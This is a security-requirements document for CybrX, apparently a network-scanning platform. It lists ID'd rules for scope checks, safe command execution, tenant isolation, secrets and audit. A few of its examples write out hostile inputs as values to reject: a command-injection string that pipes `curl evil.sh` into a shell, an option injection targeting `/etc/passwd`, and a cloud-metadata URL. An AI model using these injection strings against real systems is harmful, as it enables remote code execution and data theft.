# CybrX — Security by Design

Security requirements for building CybrX. They apply from Phase 1. Each requirement has an ID so code reviews can cite it (e.g. "violates SBD-04").

**Baselines:** OWASP ASVS Level 2 (portal and API requirements), NIST SSDF SP 800-218 (how we build), CISA Secure by Design principles (secure defaults).

---

## 1. Scope guard — non-negotiable

| ID | Requirement | Example |
|---|---|---|
| SBD-01 | Every target is checked against the group's allow-list and deny-list **before any tool runs**; out-of-scope targets are blocked and logged | Group allows `192.168.56.0/24`; target `8.8.8.8` → blocked, logged, scan continues without it |
| SBD-02 | An always-deny list applies to every scan: cloud metadata (`169.254.0.0/16`, `100.100.100.200`, `fd00:ec2::254`), loopback, the platform's own IPs/hostnames. In production the platform inventory (`CYBRX_PLATFORM_DENY` + `CYBRX_PLATFORM_DENY_HOSTNAMES`, listing **every** platform hostname and IP) is mandatory: without it every check fails closed | A "web app" target `http://169.254.169.254/latest/meta-data/` → blocked |
| SBD-03 | Hostnames are resolved and the **resolved IPs** are scope-checked too (stops DNS tricks) | `evil.example` resolving to `127.0.0.1` → blocked |
| SBD-04 | Scans run only between the scope's `starts_at` and `ends_at` | Scan launched after the engagement ended → refused |
| SBD-05 | Every scope records who authorised it and when; an authorisation time in the future blocks the scan; a scope cannot be changed after it is created | `authorised_by = "J. Smith (IT Manager)"`, `authorised_at = 2026-11-16T20:00Z` |
| SBD-06 | Fail closed: if the scope check errors, the scan does not run | DNS timeout during check → target skipped, not scanned |
| SBD-07 | During development, scan **only** the isolated lab. Enforced in code: `CYBRX_MODE=development` (the default) blocks anything outside `CYBRX_LAB_NETWORKS`, whatever a scope's allow-list says | Allow-list `198.51.100.77/32`, target `198.51.100.77` → blocked (lab boundary) |

## 2. Safe command execution

| ID | Requirement | Example |
|---|---|---|
| SBD-10 | Never use `shell=True`, `os.system` or string-built commands; pass arguments as a list | `subprocess.run(["nmap", "-sV", target], ...)` |
| SBD-11 | Validate every target strictly before use: IP/CIDR with `ipaddress`, hostnames against a strict pattern, URLs parsed with `urllib.parse` (http/https only) | `10.0.0.1; curl evil.sh \| sh` → rejected as invalid |
| SBD-12 | Reject targets that start with `-` (option injection) | `-oN /etc/passwd` → rejected |
| SBD-13 | Every tool call has a timeout and output size limit | nmap capped at 2 h; output over 200 MB → aborted |
| SBD-14 | Safe defaults: rate limits on; no DoS, brute-force, destructive or intrusive checks unless the engagement explicitly enables them | nuclei runs with `-rl` set and excludes `dos`, `intrusive`, `fuzz` tags by default |

## 3. Isolation and least privilege

| ID | Requirement | Example |
|---|---|---|
| SBD-20 | Portal, API, database and workers on separate networks; database has no public IP; workers accept no inbound connections | Portal compromise ≠ database access |
| SBD-21 | Scanner containers run as non-root, read-only filesystem, all Linux capabilities dropped except `NET_RAW` where nmap needs it | A bug in ZAP exploited by a malicious site stays inside a throwaway container |
| SBD-22 | Scanner egress limited to authorised targets (Phase 2+) | Worker cannot call arbitrary internet hosts |
| SBD-23 | Each service has its own credentials with minimum rights | Report service can read findings, cannot launch scans |

## 4. Identity and tenant isolation

| ID | Requirement | Example |
|---|---|---|
| SBD-30 | Authentication only through Keycloak (OIDC); MFA mandatory; short-lived tokens | Access token 5–15 min, refresh rotated |
| SBD-31 | Roles: Owner, Analyst, Viewer (per customer) | Viewer can download reports, cannot launch scans |
| SBD-32 | Tenant isolation in two layers: every query filtered by customer in the API **and** PostgreSQL row-level security | A forgotten filter still returns only the tenant's rows |
| SBD-33 | Object IDs are not guessable (UUIDs) and every access is authorisation-checked | `/reports/2` → not a valid ID; another tenant's UUID → 404 |

## 5. Secrets and data protection

| ID | Requirement | Example |
|---|---|---|
| SBD-40 | Scan credentials (SSH/SMB) encrypted with a KMS/Vault key; never logged; never shown again after saving | UI shows `••••• (set 2026-11-16)` |
| SBD-41 | No secrets in code or Git; use environment variables / secret store; `gitleaks` in CI | Commit containing an API key fails the build |
| SBD-42 | TLS 1.2+ everywhere; mutual TLS for agents; encrypted disks and backups | Agent without a valid client certificate is refused |
| SBD-43 | Reports downloaded through signed, expiring links | A forwarded link stops working after 15 minutes |
| SBD-44 | Evidence is redacted: no passwords, tokens or session cookies stored or shown | `Set-Cookie: session=[REDACTED]` |
| SBD-45 | Data retention: raw scan output kept N days (configurable), then deleted; customer can request deletion | Raw output purged after 90 days |

## 6. Audit

| ID | Requirement | Example |
|---|---|---|
| SBD-50 | Audit log of every scan: who launched it, against what, when, exact command lines, tool versions | `{"user":"analyst@demo","group":"lab","cmd":["nmap","-sV","192.168.56.101"],"nmap":"7.95"}` |
| SBD-51 | Audit log is append-only and cannot be edited through the application | No update/delete API for audit entries |
| SBD-52 | Blocked targets and failed logins are logged | Scope violation → audit entry with reason |

## 7. Supply chain and feeds

| ID | Requirement | Example |
|---|---|---|
| SBD-60 | Pin tool and library versions; keep an SBOM; scan our own images (Trivy) | `nuclei==3.x.y` pinned in the worker image |
| SBD-61 | Nuclei templates come only from the official repo; custom templates are code-reviewed before use | A template that sends data to an unknown host never reaches production |
| SBD-62 | Feed downloads over HTTPS with integrity checks where the feed offers them | Greenbone feed signature verified |
| SBD-63 | Dependencies monitored (Dependabot or similar) | Vulnerable library → PR raised automatically |

## 8. Secure development pipeline

| ID | Requirement | Example |
|---|---|---|
| SBD-70 | Every commit: Semgrep (static analysis), gitleaks, dependency check, unit tests | Use of `shell=True` flagged by Semgrep rule |
| SBD-71 | Every task reviewed by the second AI assistant (or a person) against this file | Review comment: "violates SBD-10" |
| SBD-72 | Before each release (Phase 3+): ZAP scan of our own portal | No High findings before release |
| SBD-73 | Threat model (STRIDE) per component before building it | API threat: tenant A reading tenant B → SBD-32 |

## 9. Before public launch (Phase 6 gate)

- [ ] Target ownership verification for external scans (DNS TXT record or file on web root)
- [ ] Authorisation checkbox + terms of service, stored with user and timestamp on every scan
- [ ] Per-plan scan limits and rate limits
- [ ] Cloud provider's scanning policy checked; dedicated scanner IPs published for customer allow-listing
- [ ] Independent pentest of the CybrX platform itself, findings fixed
- [ ] Incident response plan for a breach of CybrX (a breached scanner exposes every customer's weaknesses)
- [ ] All SBD requirements above verified
